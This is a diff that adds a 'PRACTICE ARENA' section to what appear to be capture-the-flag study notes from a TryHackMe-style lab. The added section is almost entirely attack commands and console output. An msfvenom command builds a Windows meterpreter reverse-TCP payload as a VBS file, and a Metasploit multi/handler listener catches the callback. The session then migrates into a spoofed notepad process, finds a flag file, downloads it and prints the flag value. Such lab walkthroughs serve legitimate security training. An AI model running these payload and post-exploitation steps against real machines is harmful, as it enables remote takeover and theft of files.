@@ -302,6 +302,79 @@ REFERENCES:
 
 
 
+## PRACTICE ARENA
+
+```
+lhost=10.10.69.72
+
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.69.72 LPORT=4444 -f vbs -o shell.vbs
+
+
+meterpreter > background
+use multi/handler
+set PAYLOAD windows/meterpreter/reverse_tcp
+set LHOST 10.10.69.72
+set LPORT 4444
+run -j
+
+
+
+msf6 exploit(multi/handler) > 
+[*] Sending stage (175686 bytes) to 10.10.159.1
+[*] Meterpreter session 1 opened (10.10.69.72:4444 -> 10.10.159.1:49741) at 2024-01-15 11:22:08 +0000
+
+msf6 exploit(multi/handler) > sessions -l
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information               Connection
+  --  ----  ----                     -----------               ----------
+  1         meterpreter x86/windows  DESKTOP-1AU6NT4\thm @ DE  10.10.69.72:4444 -> 10.1
+                                     SKTOP-1AU6NT4             0.159.1:49741 (10.10.159
+                                                               .1)
+
+msf6 exploit(multi/handler) > sessions 1
+[*] Starting interaction with 1...
+meterpreter > pwd
+C:\app
+meterpreter > sysinfo
+Computer        : DESKTOP-1AU6NT4
+OS              : Windows 10 (10.0 Build 14393).
+Architecture    : x64
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 1
+Meterpreter     : x86/windows
+meterpreter > 
+
+meterpreter > run post/windows/manage/migrate
+
+[*] Running module against DESKTOP-1AU6NT4
+[*] Current server process: bqjQbtJnswk.exe (3896)
+[*] Spawning notepad.exe process to migrate into
+[*] Spoofing PPID 0
+[*] Migrating into 2720
+[+] Successfully migrated into process 2720
+
+meterpreter > search -f flag.txt
+Found 1 result...                                                                                  
+=================                                                                                  
+                                                                                                   
+Path                           Size (bytes)  Modified (UTC)
+----                           ------------  --------------
+c:\Users\thm\Desktop\flag.txt  37            2021-11-27 18:25:56 +0000
+
+meterpreter > download 'c:\Users\thm\Desktop\flag.txt'
+[*] Downloading: c:\Users\thm\Desktop\flag.txt -> /root/flag.txt
+[*] Downloaded 37.00 B of 37.00 B (100.0%): c:\Users\thm\Desktop\flag.txt -> /root/flag.txt
+[*] download   : c:\Users\thm\Desktop\flag.txt -> /root/flag.txt
+meterpreter > cat 'c:\Users\thm\Desktop\flag.txt'
+THM{b4dbc2f16afdfe9579030a929b799719}
+
+```
+
+
 
 
 
